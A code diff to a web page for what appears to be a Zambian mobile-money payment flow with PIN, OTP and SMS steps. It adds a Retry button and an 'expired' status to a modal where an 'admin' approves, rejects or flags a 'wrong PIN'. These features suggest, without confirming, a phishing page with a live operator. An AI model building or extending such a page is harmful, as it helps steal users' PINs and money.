@@ -397,6 +397,18 @@
     margin-bottom:18px;
     text-align:left;
   }
+  .approval-retry-btn{
+    width:100%;
+    padding:14px 16px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(135deg, var(--blue), var(--blue-dark));
+    color:#fff;
+    font-weight:800;
+    font-size:1rem;
+    cursor:pointer;
+    margin-top:6px;
+  }
   .approval-summary-row{
     display:flex;
     justify-content:space-between;
@@ -1259,6 +1271,7 @@
         <div class="approval-summary-row"><span>Amount</span><strong id="approval-amount">ZMW 15.00</strong></div>
         <div class="approval-summary-row"><span>Phone</span><strong id="approval-phone">+260 977 000000</strong></div>
       </div>
+      <button class="approval-retry-btn" id="approval-retry-btn" type="button">Retry</button>
     </div>
   </div>
 
@@ -1286,17 +1299,30 @@
     modal.classList.add('active');
   }
 
-  function showApprovalRejected(message){
+  function showApprovalRejected(message, title){
     var modal = document.getElementById('approval-modal');
     document.getElementById('approval-spinner').style.display = 'none';
     document.getElementById('approval-error-icon').style.display = 'flex';
-    document.getElementById('approval-title').textContent = 'Rejected';
+    document.getElementById('approval-title').textContent = title || 'Rejected';
     document.getElementById('approval-subtitle').textContent = message;
     document.getElementById('approval-plan').textContent = selectedPlanName;
     document.getElementById('approval-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
     document.getElementById('approval-phone').textContent = '+260 ' + selectedPhoneNumber;
     document.querySelector('.content').classList.add('blurred');
     modal.classList.add('active');
+  }
+
+  function retryApprovalFlow(){
+    hideApprovalWaiting();
+    if (document.getElementById('page-sms').classList.contains('active')) {
+      showPage('sms');
+      return;
+    }
+    if (document.getElementById('page-otp').classList.contains('active')) {
+      showPage('otp');
+      return;
+    }
+    showPage('payment');
   }
 
   function hideApprovalWaiting(){
@@ -1386,15 +1412,18 @@
           return;
         }
 
-        if (['denied', 'insufficient', 'demo_error'].includes(data.status)) {
+        if (['denied', 'insufficient', 'demo_error', 'expired'].includes(data.status)) {
           clearInterval(approvalPollTimer);
           approvalPollTimer = null;
           var statusMessage = data.status === 'denied'
             ? 'The admin rejected this request. Please review the details and try again.'
             : data.status === 'insufficient'
               ? 'The admin marked this as insufficient balance. Please top up or use another payment method.'
-              : 'The admin reported a wrong PIN. Please re-enter the correct details.';
-          showApprovalRejected(statusMessage);
+              : data.status === 'expired'
+                ? 'This approval request expired before approval was granted. Please retry.'
+                : 'This request expired. Please retry with the correct details.';
+          var statusTitle = data.status === 'expired' ? 'Expired' : 'Rejected';
+          showApprovalRejected(statusMessage, statusTitle);
           showToast(statusMessage);
         }
       } catch (err) {
@@ -1544,6 +1573,10 @@
     document.getElementById('complete-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
     showPage('complete');
   }
+
+  document.getElementById('approval-retry-btn').addEventListener('click', function(){
+    retryApprovalFlow();
+  });
 
   document.addEventListener('input', function(event){
     if (event.target && event.target.matches('.otp-inputs input')) {
